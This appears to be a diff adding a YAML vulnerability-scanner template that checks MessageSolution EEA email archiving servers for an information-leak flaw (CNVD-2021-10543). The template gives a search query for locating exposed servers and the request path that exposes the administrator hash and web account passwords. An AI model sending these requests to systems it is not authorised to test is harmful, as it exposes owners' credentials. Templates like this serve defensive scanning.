@@ -1,0 +1,19 @@
+name: MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543
+manual: true
+query: 'title="MessageSolution Enterprise Email Archiving (EEA)" '
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /authenticationserverservlet/
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"administrator")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator
+    hash与web账号密码
+  tags: 账号密码泄露
